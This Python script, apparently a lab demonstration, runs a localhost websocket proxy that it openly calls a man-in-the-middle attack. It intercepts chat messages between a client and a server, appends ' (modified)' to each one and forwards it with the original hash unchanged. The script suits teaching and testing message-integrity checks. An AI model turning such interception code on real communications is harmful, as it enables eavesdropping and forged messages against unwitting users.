import asyncio
import json

import websockets

client_URI = "ws://localhost:8765"
server_URI = "ws://localhost:8766"

print("Begin Man-in-the-Middle attack to intercept and modify messages between client and server")
async def send_message(ws1, ws2):
    async for message in ws1:
        try:
            chat_with, message, hash_value = json.loads(message)
            message += " (modified)"
            print(f"intercepted message to: {chat_with}")
            await ws2.send(json.dumps([chat_with, message, hash_value]))
        except websockets.exceptions.ConnectionClosed:
            break
        except json.decoder.JSONDecodeError:
            await ws2.send(message)

async def handler(client_ws, path):
    async with websockets.connect(server_URI) as server_ws:
        await asyncio.gather(send_message(client_ws, server_ws), send_message(server_ws, client_ws))


start_server = websockets.serve(handler, "localhost", 8765)

asyncio.get_event_loop().run_until_complete(start_server)
asyncio.get_event_loop().run_forever()
